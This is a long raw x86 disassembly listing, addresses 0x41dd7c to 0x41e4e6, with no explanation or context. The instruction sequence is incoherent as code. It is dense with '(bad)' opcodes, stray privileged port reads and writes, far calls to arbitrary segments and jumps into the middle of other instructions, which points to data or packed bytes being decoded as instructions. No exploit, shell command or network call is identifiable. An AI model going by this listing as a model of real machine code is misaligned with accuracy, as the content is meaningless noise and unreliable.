  41dd7c:	shl    DWORD PTR [ecx+0x6d],cl
  41dd7f:	pushf  
  41dd80:	add    eax,0xf2bcddee
  41dd85:	jmp    0x98c19c4
  41dd8a:	pusha  
  41dd8b:	mov    ah,0x78
  41dd8d:	push   0x46
  41dd8f:	push   DWORD PTR [esi-0x25]
  41dd92:	lea    ebx,[ebx+eiz*4+0x32e32967]
  41dd99:	sbb    BYTE PTR [ecx+0x5858a0cb],0xfc
  41dda0:	jge    0x41dda3
  41dda2:	mov    bh,0x7f
  41dda4:	fwait
  41dda5:	mov    ds:0xd2cc302b,eax
  41ddaa:	ins    BYTE PTR es:[edi],dx
  41ddab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddac:	ins    DWORD PTR es:[edi],dx
  41ddad:	shl    BYTE PTR [ebp+0x865c684],1
  41ddb3:	sub    edi,DWORD PTR [ebx+0x33]
  41ddb6:	mov    bl,0x19
  41ddb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddb9:	fstp   DWORD PTR [ebx-0x6bf9742]
  41ddbf:	sub    BYTE PTR [eax+0x6d],0xe3
  41ddc3:	stos   BYTE PTR es:[edi],al
  41ddc4:	mov    DWORD PTR [edx],ebx
  41ddc6:	es sbb al,0xa2
  41ddc9:	add    eax,0x89f2408b
  41ddce:	and    DWORD PTR [esi+edi*1+0x5290d532],ecx
  41ddd5:	inc    esi
  41ddd6:	nop
  41ddd7:	arpl   WORD PTR [edx+0x16ba6aaa],di
  41dddd:	add    eax,DWORD PTR [eax+0xd2e0a66]
  41dde3:	jnp    0x41de40
  41dde5:	out    dx,al
  41dde6:	rcr    BYTE PTR [ebx+0x37f1b15b],1
  41ddec:	js     0x41de4f
  41ddee:	push   edx
  41ddef:	lock in eax,0x34
  41ddf2:	retf   0x5568
  41ddf5:	pop    es
  41ddf6:	int3   
  41ddf7:	adc    ebx,DWORD PTR [edx]
  41ddf9:	cmp    BYTE PTR [esi],ch
  41ddfb:	mov    esi,0xfea1a6e0
  41de00:	push   ebx
  41de01:	or     al,0x72
  41de03:	(bad)  
  41de04:	dec    cl
  41de06:	(bad)  
  41de07:	aaa    
  41de08:	sub    bh,ch
  41de0a:	(bad)  
  41de0b:	iret   
  41de0c:	cdq    
  41de0d:	mov    DWORD PTR [edx],eax
  41de0f:	ficomp DWORD PTR [ecx]
  41de11:	xor    eax,0xb00b7f86
  41de16:	rol    cl,0xc4
  41de19:	jo     0x41de3c
  41de1b:	pop    eax
  41de1c:	adc    eax,0xd5475c63
  41de21:	in     al,dx
  41de22:	jbe    0x41de4b
  41de24:	(bad)  
  41de25:	ror    DWORD PTR [edx-0x1c9bc48c],cl
  41de2b:	ja     0x41ddc4
  41de2d:	push   es
  41de2e:	xchg   esp,eax
  41de2f:	sahf   
  41de30:	loope  0x41deac
  41de32:	add    BYTE PTR [edx],dl
  41de34:	fldenv [esi]
  41de36:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41de38:	adc    BYTE PTR [esp+ebx*8+0x2f5dc2c0],dh
  41de3f:	xchg   esi,eax
  41de40:	adc    ecx,ecx
  41de42:	lea    esi,[eax]
  41de44:	fnstenv [esi+ecx*8]
  41de47:	dec    ecx
  41de48:	or     DWORD PTR [edx+edi*8-0x45],eax
  41de4c:	or     BYTE PTR [eax-0x4d],ah
  41de4f:	int3   
  41de50:	add    al,0xf
  41de52:	mov    edx,0x9c4762f2
  41de57:	(bad)  
  41de58:	in     eax,dx
  41de59:	shl    BYTE PTR [ebp-0x7d1d45cd],cl
  41de5f:	nop
  41de60:	push   0xffffffa6
  41de62:	vmulss xmm3,xmm5,DWORD PTR [ecx]
  41de66:	std    
  41de67:	outs   dx,BYTE PTR ds:[esi]
  41de68:	mov    al,ds:0x53ccfb6a
  41de6d:	jo     0x41deed
  41de6f:	push   cs
  41de70:	push   ss
  41de71:	retf   
  41de72:	mov    dh,bh
  41de74:	loop   0x41de7d
  41de76:	mov    dl,0x97
  41de78:	enter  0x7932,0xff
  41de7c:	dec    esi
  41de7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de7e:	call   0x5dec:0x573a0df3
  41de85:	pop    ds
  41de86:	inc    ebp
  41de87:	mov    ch,0xc
  41de89:	sbb    BYTE PTR ds:0xbed23fec,dh
  41de8f:	ds test al,0x52
  41de92:	jl     0x41de71
  41de94:	dec    eax
  41de95:	lods   al,BYTE PTR ds:[esi]
  41de96:	pop    ecx
  41de97:	sbb    eax,0x57ca4eed
  41de9c:	arpl   ax,si
  41de9e:	add    DWORD PTR [ebx-0xa],0xda6cfe23
  41dea5:	iret   
  41dea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dea7:	lods   eax,DWORD PTR ds:[esi]
  41dea8:	(bad)  
  41dea9:	xchg   ebx,eax
  41deaa:	mov    ch,0x24
  41deac:	stos   BYTE PTR es:[edi],al
  41dead:	lods   al,BYTE PTR ds:[esi]
  41deae:	ficomp WORD PTR [esi-0x44]
  41deb1:	pcmpgtd mm6,QWORD PTR [ebx+0x48c61f0c]
  41deb8:	test   eax,0x2ce41b75
  41debd:	call   0x33201419
  41dec2:	inc    ecx
  41dec3:	push   es
  41dec4:	mov    ds:0xa1f159e5,al
  41dec9:	sub    ecx,DWORD PTR [edx+0x1af92761]
  41decf:	inc    esp
  41ded0:	test   eax,0x98fd8cbe
  41ded5:	mov    dl,0x31
  41ded7:	loope  0x41df4f
  41ded9:	jg     0x41df46
  41dedb:	inc    esi
  41dedc:	push   edi
  41dedd:	or     eax,0x41aad392
  41dee2:	dec    esi
  41dee3:	shr    BYTE PTR [ecx],1
  41dee5:	inc    esi
  41dee6:	int    0xa4
  41dee8:	je     0x41dee3
  41deea:	in     al,0xb1
  41deec:	jnp    0x41def4
  41deee:	mov    ah,0x59
  41def0:	push   ebp
  41def1:	mov    dh,0xc0
  41def3:	cmp    DWORD PTR [ecx+0x14],esi
  41def6:	scas   al,BYTE PTR es:[edi]
  41def7:	add    edx,ebp
  41def9:	outs   dx,DWORD PTR ds:[esi]
  41defa:	xchg   edx,eax
  41defb:	retf   
  41defc:	and    eax,0x2ddec939
  41df01:	iret   
  41df02:	mov    al,0xef
  41df04:	call   0xd0d1:0x466ff73c
  41df0b:	loopne 0x41df6b
  41df0d:	mov    BYTE PTR [edi+eax*4],cl
  41df10:	cmp    dl,cl
  41df12:	test   eax,0x643eaf8f
  41df17:	add    esi,ebx
  41df19:	mov    dl,0x96
  41df1b:	jle    0x41df8f
  41df1d:	ror    DWORD PTR [esi],0xec
  41df20:	or     bh,BYTE PTR [edi]
  41df22:	inc    ebp
  41df23:	mov    esp,0xdd41558b
  41df28:	push   0x146f3b0f
  41df2d:	(bad)  
  41df2e:	in     al,dx
  41df2f:	or     BYTE PTR [edi-0x69],bl
  41df32:	push   edi
  41df33:	add    ecx,DWORD PTR [ebx-0x13]
  41df36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df37:	mov    edx,0x4733891b
  41df3c:	cmc    
  41df3d:	(bad)  
  41df3e:	fmul   DWORD PTR [ebx+0x1f]
  41df41:	cmp    ebx,DWORD PTR [edx-0x16]
  41df44:	adc    dl,dl
  41df46:	mov    ebx,0x57f04823
  41df4b:	mov    ebx,0x347485a9
  41df50:	sbb    DWORD PTR [edi+0x4a],ebx
  41df53:	sti    
  41df54:	std    
  41df55:	adc    al,0x10
  41df57:	je     0x41dfbb
  41df59:	ret    
  41df5a:	outs   dx,BYTE PTR ds:[esi]
  41df5b:	in     al,0xb3
  41df5d:	scas   al,BYTE PTR es:[edi]
  41df5e:	push   eax
  41df5f:	mov    edi,DWORD PTR [edx]
  41df61:	aam    0x91
  41df63:	dec    DWORD PTR [ecx-0x5528762b]
  41df69:	xchg   esp,eax
  41df6a:	xchg   esp,eax
  41df6b:	leave  
  41df6c:	sub    al,0x2a
  41df6e:	push   ebp
  41df6f:	out    dx,al
  41df70:	fadd   DWORD PTR [eax+0x10]
  41df73:	mov    cl,0x99
  41df75:	jle    0x41df88
  41df77:	push   edi
  41df78:	mov    ah,0xd6
  41df7a:	mov    ebp,0x3a1298
  41df7f:	call   0x6cd7:0x6601bd15
  41df86:	gs das 
  41df88:	mov    ebx,DWORD PTR [ecx+0x25]
  41df8b:	dec    esp
  41df8c:	fnstsw WORD PTR [edx]
  41df8e:	jmp    0xf2ff272f
  41df93:	xor    al,0x8c
  41df95:	loopne 0x41dfda
  41df97:	dec    ebx
  41df98:	aam    0x90
  41df9a:	in     al,0x7d
  41df9c:	mov    ch,0x9f
  41df9e:	inc    ebp
  41df9f:	retf   0x244f
  41dfa2:	xchg   ecx,eax
  41dfa3:	stos   DWORD PTR es:[edi],eax
  41dfa4:	aad    0x9e
  41dfa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfa7:	inc    ecx
  41dfa8:	cmp    eax,0xc8f85122
  41dfad:	inc    ecx
  41dfae:	leave  
  41dfaf:	xchg   DWORD PTR [ebp-0x29],ebx
  41dfb2:	int3   
  41dfb3:	push   esp
  41dfb4:	inc    edi
  41dfb6:	addr16 push ecx
  41dfb8:	into   
  41dfb9:	jbe    0x41e023
  41dfbb:	dec    ebp
  41dfbc:	dec    ebx
  41dfbd:	jge    0x41df9b
  41dfbf:	mov    ebp,0xd7afcfb4
  41dfc4:	outs   dx,BYTE PTR ds:[esi]
  41dfc5:	xchg   esp,eax
  41dfc6:	pop    esp
  41dfc7:	dec    ebp
  41dfc8:	lods   al,BYTE PTR ds:[esi]
  41dfc9:	dec    esp
  41dfca:	push   es
  41dfcb:	test   al,0x2c
  41dfcd:	cmc    
  41dfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfcf:	mov    ebp,0x6b808185
  41dfd4:	pop    esp
  41dfd5:	dec    esi
  41dfd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfd7:	mov    ebp,0x5c0d64eb
  41dfdc:	ins    DWORD PTR es:[edi],dx
  41dfdd:	xor    edx,ebp
  41dfdf:	pop    esp
  41dfe0:	mov    dl,0xd9
  41dfe2:	mov    ecx,DWORD PTR ds:0xff9c4e11
  41dfe8:	in     eax,0xba
  41dfea:	or     esp,ebp
  41dfec:	cli    
  41dfed:	lds    ebp,FWORD PTR [ecx-0x5e]
  41dff0:	push   esi
  41dff1:	sub    BYTE PTR [edi+0xb560060],bl
  41dff7:	lock xor ah,BYTE PTR [eax-0x17]
  41dffb:	xor    DWORD PTR [esp+edx*2],ebp
  41dffe:	sbb    dl,BYTE PTR [esi+0x6618d40]
  41e004:	ror    esp,1
  41e006:	push   ebx
  41e007:	sub    BYTE PTR [ebp-0x1b9acf7],al
  41e00d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e00e:	lods   al,BYTE PTR ds:[esi]
  41e00f:	and    eax,0xba65c3c4
  41e014:	mov    eax,ds:0x6a148a1f
  41e019:	rcl    DWORD PTR [esi-0x6a9caa14],1
  41e01f:	stos   BYTE PTR es:[edi],al
  41e020:	jg     0x41dfca
  41e022:	xchg   edx,eax
  41e023:	call   0x89c1:0x141c496e
  41e02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e02b:	xchg   BYTE PTR [esi+0x3266ce5f],dl
  41e031:	adc    dl,BYTE PTR [edx]
  41e033:	sub    DWORD PTR [ebx+esi*1+0x48abae23],0xc814c69d
  41e03e:	or     DWORD PTR [edi-0x43],ebx
  41e041:	pop    es
  41e042:	fldenv [edi-0x31]
  41e045:	lds    ebp,FWORD PTR [eax-0xa]
  41e048:	mov    al,0x7f
  41e04a:	mov    bh,0xa
  41e04c:	es (bad) 
  41e04e:	clc    
  41e04f:	stos   DWORD PTR es:[edi],eax
  41e050:	cmp    dl,ch
  41e052:	mov    al,0x70
  41e054:	into   
  41e055:	ret    
  41e056:	push   ss
  41e057:	mov    ebx,0x18694e16
  41e05c:	fwait
  41e05d:	add    cl,al
  41e05f:	cld    
  41e060:	(bad)  
  41e061:	in     al,dx
  41e062:	and    esp,edi
  41e064:	push   edx
  41e065:	or     DWORD PTR [esi+eax*8],eax
  41e068:	mov    ds:0x6c640073,eax
  41e06d:	fld    QWORD PTR [esi+0x1de4d5e0]
  41e073:	in     eax,dx
  41e074:	fistp  WORD PTR [ebp-0x7f]
  41e077:	loopne 0x41e0b1
  41e079:	dec    ebp
  41e07a:	fsubr  DWORD PTR [esi+0x1be8417d]
  41e080:	ficom  DWORD PTR [edi]
  41e082:	mov    esi,0x1a2b5f1e
  41e087:	jbe    0x41e0bd
  41e089:	mov    esp,0x7ef2b3dc
  41e08e:	mov    ds:0xb951fd52,eax
  41e093:	push   esp
  41e094:	into   
  41e095:	pop    ss
  41e096:	out    0x6b,al
  41e098:	(bad)  
  41e099:	adc    edx,DWORD PTR [ecx]
  41e09b:	clc    
  41e09c:	mov    edi,0x8baac01d
  41e0a1:	xor    ebx,DWORD PTR [edx-0x22]
  41e0a4:	jmp    0xe46f8c94
  41e0a9:	jne    0x41e04d
  41e0ab:	ret    0xc5ed
  41e0ae:	leave  
  41e0af:	jle    0x41e05d
  41e0b1:	sar    DWORD PTR [edx],1
  41e0b3:	or     ch,BYTE PTR [edi-0x73]
  41e0b6:	adc    eax,0x86d347aa
  41e0bb:	out    0x65,al
  41e0bd:	pop    ebx
  41e0be:	das    
  41e0bf:	fistp  WORD PTR [edx+0x133bf15c]
  41e0c5:	mov    al,ds:0x2303454e
  41e0ca:	shr    BYTE PTR [ecx-0x4a705bd6],cl
  41e0d0:	out    0x91,eax
  41e0d2:	mov    ds:0xb1ff059f,eax
  41e0d7:	and    cl,BYTE PTR [esi]
  41e0d9:	fs xchg ebp,eax
  41e0db:	(bad)  
  41e0dc:	mov    al,0xde
  41e0de:	push   edx
  41e0df:	xchg   edi,eax
  41e0e0:	cwde   
  41e0e1:	mov    ah,BYTE PTR [ebx-0x4b]
  41e0e4:	cmp    dl,BYTE PTR [edx+esi*8+0x3374b52d]
  41e0eb:	push   ds
  41e0ec:	mov    esp,0xb1245dae
  41e0f1:	icebp  
  41e0f2:	popf   
  41e0f3:	add    BYTE PTR [eax+0x62],dh
  41e0f6:	jb     0x41e137
  41e0f8:	inc    edi
  41e0f9:	nop
  41e0fa:	jno    0x41e082
  41e0fc:	rcl    BYTE PTR [ebp+0x6289c311],cl
  41e102:	or     bh,bh
  41e104:	in     al,dx
  41e105:	dec    ebp
  41e106:	mov    edi,0x30fcc0dc
  41e10b:	fist   DWORD PTR [edi-0x2d]
  41e10e:	push   esp
  41e10f:	std    
  41e110:	out    0x45,eax
  41e112:	pop    edx
  41e113:	js     0x41e145
  41e115:	outs   dx,DWORD PTR ds:[esi]
  41e116:	loope  0x41e10f
  41e118:	pop    edx
  41e119:	aad    0x77
  41e11b:	das    
  41e11c:	(bad)  ds:0x2a05d575
  41e123:	push   esp
  41e124:	fnsave [eax-0x13]
  41e127:	outs   dx,BYTE PTR ds:[esi]
  41e128:	in     al,0x8c
  41e12a:	jl     0x41e185
  41e12c:	jns    0x41e11a
  41e12e:	jp     0x41e18f
  41e130:	mov    bl,0x34
  41e132:	mov    bh,BYTE PTR [edi+0x3ab8c48a]
  41e138:	sahf   
  41e139:	sub    esi,DWORD PTR [esi]
  41e13b:	fisub  DWORD PTR [esi+0x31205f48]
  41e141:	or     dl,al
  41e143:	mov    al,0xb0
  41e145:	mov    BYTE PTR es:[edx],0xb3
  41e149:	(bad)  
  41e14a:	dec    esp
  41e14b:	nop
  41e14c:	xchg   ebx,eax
  41e14d:	int    0x73
  41e14f:	pop    edi
  41e150:	aam    0xdf
  41e152:	mov    bl,0x7
  41e154:	push   ds
  41e155:	sbb    edx,edi
  41e157:	push   cs
  41e158:	dec    ebx
  41e159:	adc    al,0x3d
  41e15b:	imul   ebx,DWORD PTR [ebx+0x1f57633e],0xf
  41e162:	lea    ebx,[edx-0x32]
  41e165:	hlt    
  41e166:	mov    ah,0xac
  41e168:	mov    ebp,0x79604a2f
  41e16d:	lods   eax,DWORD PTR ds:[esi]
  41e16e:	ror    ah,1
  41e170:	(bad)  
  41e171:	jb     0x41e14b
  41e173:	mov    ebp,0x51a6576
  41e178:	inc    ebx
  41e179:	rcl    BYTE PTR [ebx],0x8f
  41e17c:	sbb    al,BYTE PTR [edi]
  41e17e:	test   ah,dh
  41e180:	shl    al,cl
  41e182:	sbb    eax,0x6ced9420
  41e187:	cld    
  41e188:	add    BYTE PTR [ecx],0xde
  41e18b:	ins    DWORD PTR es:[edi],dx
  41e18c:	stc    
  41e18d:	in     al,0x1c
  41e18f:	sbb    ch,0x94
  41e192:	stos   DWORD PTR es:[edi],eax
  41e193:	jnp    0x41e1b5
  41e195:	or     edx,DWORD PTR [esi+0x550793bf]
  41e19b:	aas    
  41e19c:	pusha  
  41e19d:	add    eax,0x4bb9e39e
  41e1a2:	fdivr  QWORD PTR [edi+0x164b0437]
  41e1a8:	pop    ss
  41e1a9:	leave  
  41e1aa:	jns    0x41e1f0
  41e1ac:	outs   dx,BYTE PTR ds:[esi]
  41e1ad:	push   edx
  41e1ae:	xor    al,0xfb
  41e1b0:	mov    edi,0x4bca0a60
  41e1b5:	mov    ch,0x72
  41e1b7:	ins    DWORD PTR es:[edi],dx
  41e1b8:	in     eax,0x95
  41e1ba:	adc    al,0x17
  41e1bc:	sar    BYTE PTR [eax+0x455dcced],1
  41e1c2:	and    ah,BYTE PTR [edx-0x26]
  41e1c5:	jmp    0xad37bf74
  41e1ca:	fucomi st,st(7)
  41e1cc:	data16 fcomp DWORD PTR [ecx]
  41e1cf:	int    0x26
  41e1d1:	ins    DWORD PTR es:[edi],dx
  41e1d2:	jns    0x41e1b1
  41e1d4:	jbe    0x41e240
  41e1d6:	icebp  
  41e1d7:	out    0xd0,eax
  41e1d9:	lods   eax,DWORD PTR ds:[esi]
  41e1da:	hlt    
  41e1db:	retf   
  41e1dc:	js     0x41e189
  41e1de:	outs   dx,BYTE PTR ds:[esi]
  41e1df:	jb     0x41e17f
  41e1e1:	ret    
  41e1e2:	in     eax,0x48
  41e1e4:	es ds sub al,0x3f
  41e1e8:	lahf   
  41e1e9:	outs   dx,DWORD PTR ds:[esi]
  41e1ea:	push   ss
  41e1eb:	push   edi
  41e1ec:	popf   
  41e1ed:	out    dx,eax
  41e1ee:	mov    edi,0xf38bb85b
  41e1f3:	cld    
  41e1f4:	aas    
  41e1f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f6:	xor    al,0x0
  41e1f8:	dec    ebp
  41e1f9:	ja     0xc0e1a55
  41e1ff:	out    dx,al
  41e200:	(bad)  
  41e201:	fidiv  DWORD PTR [esi]
  41e203:	ror    BYTE PTR [ecx],cl
  41e205:	imul   ebp,DWORD PTR [edx],0xffffffe2
  41e208:	pop    ds
  41e209:	xchg   BYTE PTR fs:[eax+eiz*2],dh
  41e20d:	dec    esi
  41e20e:	test   al,0xa9
  41e210:	mov    al,0x57
  41e212:	xor    eax,0x13e96e51
  41e217:	inc    esp
  41e218:	hlt    
  41e219:	sub    cl,BYTE PTR [eax-0x39]
  41e21c:	daa    
  41e21d:	mov    edi,0xd281ab00
  41e222:	mov    bh,0x90
  41e224:	dec    esp
  41e225:	push   es
  41e226:	fwait
  41e227:	test   BYTE PTR [ecx-0x4a5e09f3],bh
  41e22d:	into   
  41e22e:	jp     0x41e277
  41e230:	fmulp  st(6),st
  41e232:	push   es
  41e233:	in     eax,0xe
  41e235:	outs   dx,DWORD PTR ds:[esi]
  41e236:	(bad)  
  41e238:	(bad)  
  41e239:	pushf  
  41e23a:	fld    QWORD PTR [edx+0x3c]
  41e23d:	xor    ch,BYTE PTR [ecx+0x0]
  41e240:	imul   esp,DWORD PTR ds:[ebx-0x4fc449f0],0xdfc43c25
  41e24b:	inc    eax
  41e24c:	mov    ecx,0x9bc3bb37
  41e251:	xchg   ecx,eax
  41e252:	imul   edi
  41e254:	sti    
  41e255:	cmp    ah,dl
  41e257:	xchg   ch,ah
  41e259:	pop    eax
  41e25a:	dec    edx
  41e25b:	mov    ebp,0x4129c476
  41e260:	xchg   esi,eax
  41e261:	lods   eax,DWORD PTR ds:[esi]
  41e262:	in     eax,0x52
  41e264:	xor    BYTE PTR [ebx-0x53],dh
  41e267:	into   
  41e268:	inc    ebp
  41e269:	imul   ebx,DWORD PTR [edx],0x4623256b
  41e26f:	push   esi
  41e270:	ret    
  41e271:	imul   ebx,DWORD PTR [edx],0x6b
  41e274:	div    ecx
  41e276:	fdivr  QWORD PTR [edi-0x6ff36be3]
  41e27c:	outs   dx,DWORD PTR ds:[esi]
  41e27d:	iret   
  41e27e:	ins    BYTE PTR es:[edi],dx
  41e27f:	push   esi
  41e280:	mov    edi,0x49dc582f
  41e285:	in     al,0x82
  41e287:	ror    BYTE PTR [esi-0x1d],0x44
  41e28b:	add    eax,0x28acb2c7
  41e290:	lds    esi,FWORD PTR [edi+eax*1-0x8]
  41e294:	arpl   WORD PTR [edx+0x7f371e41],ax
  41e29a:	ja     0x41e269
  41e29c:	add    ax,0x7d18
  41e2a0:	sub    eax,0x40124d90
  41e2a5:	call   0xbe61:0xdb957296
  41e2ac:	add    BYTE PTR [ebp+0x7d822f88],ah
  41e2b2:	dec    edi
  41e2b3:	shl    BYTE PTR [ecx-0xf],1
  41e2b6:	cld    
  41e2b7:	push   edx
  41e2b8:	push   0x65dbb8ff
  41e2bd:	xor    DWORD PTR [ebp-0x34],edi
  41e2c0:	and    edi,DWORD PTR [ebp+0x568ef983]
  41e2c6:	out    dx,eax
  41e2c7:	xor    DWORD PTR [ebx],edx
  41e2c9:	mov    DWORD PTR [eax],ecx
  41e2cb:	(bad)  
  41e2cc:	dec    esp
  41e2cd:	sahf   
  41e2ce:	in     eax,0x9d
  41e2d0:	int    0x3f
  41e2d2:	mov    ds:0x99d894f5,al
  41e2d7:	jns    0x41e2a8
  41e2d9:	xchg   DWORD PTR [edi-0x39097db0],edx
  41e2df:	and    al,dl
  41e2e1:	retf   
  41e2e2:	pop    edx
  41e2e3:	lock add DWORD PTR [edx+eax*4-0x3d],ecx
  41e2e8:	xchg   ecx,eax
  41e2e9:	adc    ah,BYTE PTR ds:0xcba63df
  41e2ef:	(bad)  
  41e2f0:	jmp    0x41e30b
  41e2f2:	and    esp,DWORD PTR [ebx+0x66]
  41e2f5:	cmp    edi,DWORD PTR [edx]
  41e2f7:	ins    DWORD PTR es:[edi],dx
  41e2f8:	inc    ebx
  41e2f9:	push   cs
  41e2fa:	pop    edi
  41e2fb:	mov    BYTE PTR [ebx+ecx*2],0x7a
  41e2ff:	fmul   st,st(0)
  41e301:	scas   eax,DWORD PTR es:[edi]
  41e302:	(bad)  [ebx+0x5059d578]
  41e308:	mov    ch,0xfd
  41e30a:	push   esp
  41e30b:	inc    esp
  41e30c:	aas    
  41e30d:	wbinvd 
  41e30f:	addr16 int3 
  41e311:	cvttps2pi mm0,QWORD PTR [edx+0x3b34102c]
  41e318:	outs   dx,DWORD PTR ds:[esi]
  41e319:	sub    ah,ch
  41e31b:	jmp    0xecb7d6ed
  41e320:	adc    al,0xdf
  41e322:	fcom   DWORD PTR [edx]
  41e324:	iret   
  41e325:	aam    0xbd
  41e327:	jge    0x41e398
  41e329:	adc    dl,BYTE PTR [ebx+0x52]
  41e32c:	mov    DWORD PTR [esi+0x665aae11],ebp
  41e332:	sbb    al,0x1b
  41e334:	ror    BYTE PTR ds:0x70f9e2a5,cl
  41e33a:	adc    dh,bh
  41e33c:	shr    DWORD PTR [ebp-0x1a],cl
  41e33f:	and    al,0xdd
  41e341:	adc    ch,BYTE PTR [esi+0x2bfd9749]
  41e347:	cmp    al,0x4f
  41e349:	enter  0xb79a,0x3f
  41e34d:	jno    0x41e2e8
  41e34f:	test   DWORD PTR [edx+0x4df23709],ebx
  41e355:	jae    0x41e3d0
  41e357:	ds adc esi,ecx
  41e35a:	push   esi
  41e35b:	stos   DWORD PTR es:[edi],eax
  41e35c:	scas   al,BYTE PTR es:[edi]
  41e35d:	xchg   esp,eax
  41e35e:	mov    eax,ds:0xf6ad0b41
  41e363:	push   0xbc508748
  41e368:	dec    edx
  41e369:	inc    edx
  41e36a:	into   
  41e36b:	(bad)  
  41e36c:	xor    ch,BYTE PTR [edi-0x2ac24081]
  41e372:	ja     0x41e3c6
  41e374:	jbe    0x41e3c4
  41e376:	mov    eax,ds:0xae673287
  41e37b:	jnp    0x41e3c4
  41e37d:	retfw  0x674c
  41e381:	and    DWORD PTR ds:0xd511331a,esp
  41e387:	out    dx,al
  41e388:	push   esi
  41e389:	xchg   edx,eax
  41e38a:	mov    eax,0x9915d724
  41e38f:	cmc    
  41e390:	jnp    0x41e3f4
  41e392:	not    DWORD PTR [esi+0x43]
  41e395:	daa    
  41e396:	popa   
  41e397:	jmp    0xb80a:0x39a45eb3
  41e39e:	dec    ebx
  41e39f:	out    dx,al
  41e3a0:	sbb    DWORD PTR [ebx-0x58],edi
  41e3a3:	sbb    DWORD PTR [eax-0x42],0x69ad0f69
  41e3aa:	pop    esp
  41e3ab:	idiv   BYTE PTR [eax-0x46]
  41e3ae:	adc    al,bl
  41e3b0:	fwait
  41e3b1:	test   al,0x73
  41e3b3:	push   ds
  41e3b4:	icebp  
  41e3b5:	mov    esp,0x403f4ba0
  41e3ba:	jmp    0x41e3df
  41e3bc:	inc    edi
  41e3bd:	cli    
  41e3be:	int    0xbd
  41e3c0:	sub    al,0x9a
  41e3c2:	loop   0x41e372
  41e3c4:	callw  0x1c1a
  41e3c8:	repnz mov esi,0x71b41fc3
  41e3ce:	std    
  41e3cf:	sbb    ebx,DWORD PTR [esi-0x67]
  41e3d2:	adc    al,0x4
  41e3d4:	or     esp,DWORD PTR [edx]
  41e3d6:	or     edi,DWORD PTR [esi-0x1b]
  41e3d9:	push   0x9d0e863c
  41e3de:	xchg   edi,eax
  41e3df:	sbb    esp,DWORD PTR [esi+0x35]
  41e3e2:	pop    ebx
  41e3e3:	or     BYTE PTR [esi],dl
  41e3e5:	adc    DWORD PTR [ecx-0x20],esp
  41e3e8:	inc    eax
  41e3e9:	mov    ecx,0x26e5a72
  41e3ee:	aaa    
  41e3ef:	aas    
  41e3f0:	push   esi
  41e3f1:	repz ja 0x41e455
  41e3f4:	and    al,0xd6
  41e3f6:	into   
  41e3f7:	xor    eax,0xedb236dd
  41e3fc:	out    0x6b,al
  41e3fe:	push   ebp
  41e3ff:	adc    ah,0xf9
  41e402:	test   ah,dl
  41e404:	js     0x41e3b6
  41e406:	lea    edx,[ebx]
  41e408:	xchg   ebx,eax
  41e409:	push   ds
  41e40a:	loopne 0x41e3f3
  41e40c:	mov    esi,0x82255280
  41e411:	mov    eax,0x28bd626e
  41e416:	popa   
  41e417:	scas   eax,DWORD PTR es:[edi]
  41e418:	and    al,0x1b
  41e41a:	out    dx,eax
  41e41b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e41c:	ret    
  41e41d:	cmp    eax,0xe92a85f6
  41e422:	push   ecx
  41e423:	loop   0x41e3e0
  41e425:	es inc ebp
  41e427:	cdq    
  41e428:	out    dx,eax
  41e429:	push   ebx
  41e42a:	cmp    ebx,DWORD PTR [ecx]
  41e42c:	sbb    BYTE PTR [edx+0x7847f263],cl
  41e432:	clc    
  41e433:	mov    edi,0x324d5da7
  41e438:	pop    esi
  41e439:	cs jmp 0x41e470
  41e43c:	push   0xcfb6a2a2
  41e441:	xor    al,0xff
  41e443:	and    al,0xf3
  41e445:	and    cl,BYTE PTR [esi+0x1c9f2a09]
  41e44b:	mov    WORD PTR [ecx+0x5ae9dc7a],fs
  41e451:	out    0x84,al
  41e453:	pushf  
  41e454:	pop    ss
  41e455:	push   ds
  41e456:	hlt    
  41e457:	add    al,0xfc
  41e459:	mov    esi,0xef37e2ad
  41e45e:	mov    dl,0xd9
  41e460:	sbb    DWORD PTR [edi],0x57f8a9e5
  41e466:	push   edx
  41e467:	mov    ds:0xe5513e46,eax
  41e46c:	pop    esp
  41e46d:	xchg   ecx,eax
  41e46e:	gs stos DWORD PTR es:[edi],eax
  41e470:	mov    ecx,0xd35466f1
  41e475:	aaa    
  41e476:	mov    esi,0x7c6a4e0
  41e47b:	ror    BYTE PTR [ebx+eax*4],0xa6
  41e47f:	cld    
  41e480:	ins    BYTE PTR es:[edi],dx
  41e481:	in     al,0xeb
  41e483:	pop    ss
  41e484:	ins    DWORD PTR es:[edi],dx
  41e485:	add    bh,BYTE PTR [ebx-0x3887443d]
  41e48b:	xchg   DWORD PTR [eax],eax
  41e48d:	fistp  DWORD PTR [esi-0x634152a2]
  41e493:	call   0xc2ff:0x5b1621b6
  41e49a:	(bad)  
  41e49c:	mov    es,WORD PTR [edi-0x1dba9427]
  41e4a2:	adc    DWORD PTR [ecx+0x3678e35],edx
  41e4a8:	jbe    0x41e442
  41e4aa:	call   0x9ce4:0x106f2dbd
  41e4b1:	jae    0x41e462
  41e4b3:	pop    ecx
  41e4b4:	xor    al,0xc3
  41e4b6:	addr16 inc eax
  41e4b8:	mov    eax,ds:0xf037ec62
  41e4bd:	or     BYTE PTR [ebx+0x5fdad731],cl
  41e4c3:	jp     0x41e540
  41e4c5:	into   
  41e4c6:	pop    ds
  41e4c7:	inc    edx
  41e4c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4c9:	jmp    0x41e52d
  41e4cb:	fist   WORD PTR [edi-0x3c]
  41e4ce:	jmp    0x29a39e5d
  41e4d3:	push   ecx
  41e4d4:	mov    eax,0xd2839ae0
  41e4d9:	and    esp,ebx
  41e4db:	mov    edx,0x6e6885e6
  41e4e0:	fsub   QWORD PTR [eax+0x7b163cf2]
  41e4e6:	sbb    al,0x59
